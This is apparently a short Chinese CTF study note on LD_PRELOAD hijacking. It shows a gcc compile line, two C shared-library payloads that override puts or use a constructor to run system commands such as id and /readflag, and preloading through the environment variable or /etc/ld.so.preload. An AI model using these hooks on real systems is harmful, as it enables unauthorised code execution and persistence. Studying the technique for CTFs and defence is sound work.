alias:: LD_PRELOAD

- # 介绍
	- 强制让程序启动时加载某个共享库，共享库可以“替换”c/c++程序运行时调用的函数（比如替换`puts`函数），实现从文件上传到RCE
	- payload
		- 编译：`gcc a.c -o hook.so -fPIC -shared -ldl -D_GNU_SOURCE`
			- ```c
			  #include <stdio.h>
			  #include <stdlib.h>
			  
			  int puts(const char *message) {
			    printf("hack you!!!");
			    system("id");
			    return 0;
			  }
			  ```
			- ```c
			  #include <stdlib.h>
			  #include <stdio.h>
			  #include <string.h>
			  // 这个测试时会执行无限次。。。
			  __attribute__ ((__constructor__)) void angel (void){
			    unsetenv("LD_PRELOAD");
			    system("/readflag > /tmp/wx.txt");
			  }
			  ```
- # LD_PRELOAD环境变量
	- 一个环境变量，用以指定程序启动时加载的共享库
	- ```shell
	  export LD_PRELOAD=/path/to/override.so
	  ```
- # /etc/ld.so.preload
	- 可以用来指定预加载共享库的文件，其中存储预加载共享库的路径，每行一个
	- 前置条件：查看对应的程序是否会加载这个文件`strace /bin/file`